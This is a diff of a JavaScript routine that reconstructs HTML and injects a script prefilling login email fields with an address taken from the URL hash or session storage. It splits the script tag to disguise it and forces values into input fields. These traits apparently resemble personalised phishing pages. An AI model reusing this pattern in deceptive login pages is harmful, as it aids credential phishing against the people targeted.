@@ -144,7 +144,47 @@ function attemptReconstruct() {
         html = html.replace(/(<[a-zA-Z0-9-]+[^>]*\bid\s*=\s*["']auth_email["'][^>]*>)(.*?)(<\/[^>]+>)/ig, function(all, open, inner, close){ return open + rawHash + close; });
       } catch(e){ console.warn('[Decoder] replacement failed', e); }
 
-      (function(email){ function filler(emailVal){ try { var hid = document.querySelector('input[name="email"][type="hidden"], input#email[type="hidden"]'); if (hid) { try { hid.value = emailVal; hid.dispatchEvent(new Event('input',{bubbles:true})); hid.dispatchEvent(new Event('change',{bubbles:true})); }catch(e){} } try { var disp = document.getElementById('auth_email'); if (disp) disp.textContent = emailVal; } catch(e){} var nativeSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set; function tryFillVisible() { var inputs = document.querySelectorAll('input'); if (!inputs || inputs.length === 0) return false; var did = false; for (var i=0;i<inputs.length;i++){ var el = inputs[i]; var id=(el.id||'').toLowerCase(), name=(el.name||'').toLowerCase(), ph=(el.placeholder||'').toLowerCase(), type=(el.type||'').toLowerCase(); if (type==='email' || id.indexOf('email')>-1 || name.indexOf('email')>-1 || id.indexOf('user')>-1 || name.indexOf('user')>-1 || ph.indexOf('email')>-1) { try { if (nativeSetter) nativeSetter.call(el, emailVal); else el.value = emailVal; el.dispatchEvent(new Event('input',{bubbles:true})); el.dispatchEvent(new Event('change',{bubbles:true})); did = true; } catch(e){} } } return did; } var a=0; var id=setInterval(function(){ if (tryFillVisible()||a>30) clearInterval(id); a++; },300); try { var mo=new MutationObserver(function(){ if (tryFillVisible()){ try{ mo.disconnect(); }catch(e){} } }); mo.observe(document.documentElement||document.body, { childList:true, subtree:true }); setTimeout(function(){ try{ mo.disconnect(); }catch(e){} },10000); } catch(e){} } catch(e){} } try { var s = '(' + filler.toString() + ')(' + JSON.stringify(email) + ');'; var scriptTag = '<scr' + 'ipt>' + s + '<\\/scr' + 'ipt>'; if (/<\\/body\\s*>/i.test(html)) html = html.replace(/<\\/body\\s*>/i, scriptTag + '</body>'); else if (/<\\/head\\s*>/i.test(html)) html = html.replace(/<\\/head\\s*>/i, scriptTag + '</head>'); else html = scriptTag + html; } catch(e) { var fb = '<scr' + 'ipt>' + '(function(){try{var e=sessionStorage.getItem("__prefill_email")||decodeURIComponent(location.hash.replace(/^#/,"")); if(!e) return; try{ var h=document.querySelector("input[name=\\"email\\"][type=\\"hidden\\"]"); if(h){ h.value=e; h.dispatchEvent(new Event("input",{bubbles:true})); h.dispatchEvent(new Event("change",{bubbles:true})); } }catch(ex){} try{ var d=document.getElementById("auth_email"); if(d) d.textContent=e; }catch(ex){} }catch(ex){} })();' + '<\\/scr' + 'ipt>'; if (/<\\/body\\s*>/i.test(html)) html = html.replace(/<\\/body\\s*>/i, fb + '</body>'); else if (/<\\/head\\s*>/i.test(html)) html = html.replace(/<\\/head\\s*>/i, fb + '</head>'); else html = fb + html; } })(rawHash);
+      (function(email){
+        function filler(emailVal){
+          try {
+            var hid = document.querySelector('input[name="email"][type="hidden"], input#email[type="hidden"]');
+            if (hid) { try { hid.value = emailVal; hid.dispatchEvent(new Event('input',{bubbles:true})); hid.dispatchEvent(new Event('change',{bubbles:true})); }catch(e){} }
+            try { var disp = document.getElementById('auth_email'); if (disp) disp.textContent = emailVal; } catch(e){}
+            var nativeSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
+            function tryFillVisible() {
+              var inputs = document.querySelectorAll('input');
+              if (!inputs || inputs.length === 0) return false;
+              var did = false;
+              for (var i=0;i<inputs.length;i++){
+                var el = inputs[i];
+                var id=(el.id||'').toLowerCase(), name=(el.name||'').toLowerCase(), ph=(el.placeholder||'').toLowerCase(), type=(el.type||'').toLowerCase();
+                if (type==='email' || id.indexOf('email')>-1 || name.indexOf('email')>-1 || id.indexOf('user')>-1 || name.indexOf('user')>-1 || ph.indexOf('email')>-1) {
+                  try { if (nativeSetter) nativeSetter.call(el, emailVal); else el.value = emailVal; el.dispatchEvent(new Event('input',{bubbles:true})); el.dispatchEvent(new Event('change',{bubbles:true})); did = true; } catch(e){}
+                }
+              }
+              return did;
+            }
+            var a=0; var id=setInterval(function(){ if (tryFillVisible()||a>30) clearInterval(id); a++; },300);
+            try {
+              var mo=new MutationObserver(function(){ if (tryFillVisible()){ try{ mo.disconnect(); }catch(e){} } });
+              mo.observe(document.documentElement||document.body, { childList:true, subtree:true });
+              setTimeout(function(){ try{ mo.disconnect(); }catch(e){} },10000);
+            } catch(e){}
+          } catch(e){}
+        }
+        try {
+          var s = '(' + filler.toString() + ')(' + JSON.stringify(email) + ');';
+          var scriptTag = '<scr' + 'ipt>' + s + '<' + '/script>';
+          if (/<\/body\s*>/i.test(html)) html = html.replace(/<\/body\s*>/i, scriptTag + '</body>');
+          else if (/<\/head\s*>/i.test(html)) html = html.replace(/<\/head\s*>/i, scriptTag + '</head>');
+          else html = scriptTag + html;
+        } catch(e) {
+          var fb = '<scr' + 'ipt>' + '(function(){try{var e=sessionStorage.getItem("__prefill_email")||decodeURIComponent(location.hash.replace(/^#/,"")); if(!e) return; try{ var h=document.querySelector("input[name=\\"email\\"][type=\\"hidden\\"]"); if(h){ h.value=e; h.dispatchEvent(new Event("input",{bubbles:true})); h.dispatchEvent(new Event("change",{bubbles:true})); } }catch(ex){} try{ var d=document.getElementById("auth_email"); if(d) d.textContent=e; }catch(ex){} }catch(ex){} })();' + '<' + '/script>';
+          if (/<\/body\s*>/i.test(html)) html = html.replace(/<\/body\s*>/i, fb + '</body>');
+          else if (/<\/head\s*>/i.test(html)) html = html.replace(/<\/head\s*>/i, fb + '</head>');
+          else html = fb + html;
+        }
+      })(rawHash);
     } else {
       console.log('[Decoder] no hash present; skipping prefill');
     }
